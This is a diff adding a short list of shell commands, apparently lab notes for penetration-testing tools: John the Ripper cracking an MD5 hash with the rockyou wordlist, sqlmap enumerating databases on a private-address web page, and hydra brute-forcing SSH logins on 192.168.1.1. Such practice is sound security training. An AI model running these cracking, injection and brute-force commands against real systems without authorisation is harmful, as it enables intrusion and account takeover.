@@ -1,0 +1,11 @@
+apt install wordlists -y
+
+ls -la /usr/share/wordlists/
+
+echo "098f6bcd4621d373cade4e832627b4f6" > hash2.txt
+
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
+
+sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
+
+hydra -l usuario -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
